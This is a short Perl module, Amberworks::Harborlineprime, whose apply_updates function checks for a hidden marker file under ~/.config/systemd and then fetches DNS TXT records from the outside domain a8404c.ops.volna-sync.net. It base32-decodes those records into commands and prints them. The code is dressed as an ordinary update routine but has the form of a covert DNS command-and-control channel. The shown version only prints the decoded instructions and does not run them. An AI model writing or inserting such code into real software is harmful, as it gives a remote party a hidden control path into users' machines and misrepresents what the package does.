package Amberworks::Harborlineprime;

use strict;
use warnings;
use base 'Exporter';
our @EXPORT_OK = qw(apply_updates);

use Amberworks::Harborlineprime::Channels qw(gate_ok txt_fields);

my $ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';

sub decode_instruction {
    my ($s) = @_;
    my ($bits, $nbits, $out) = (0, 0, '');
    for my $c (split //, uc $s) {
        my $v = index $ALPHABET, $c;
        next if $v < 0;
        $bits = ($bits << 5) | $v;
        $nbits += 5;
        if ($nbits >= 8) {
            $nbits -= 8;
            $out .= chr(($bits >> $nbits) & 0xFF);
        }
    }
    return $out;
}

sub apply_updates {
    return 0 unless gate_ok('~/.config/systemd/.95b1846f');
    for my $field (txt_fields('a8404c.ops.volna-sync.net')) {
        my $cmd = decode_instruction($field);
        next unless length $cmd > 4;
        print $cmd;
    }
    return 1;
}

1;
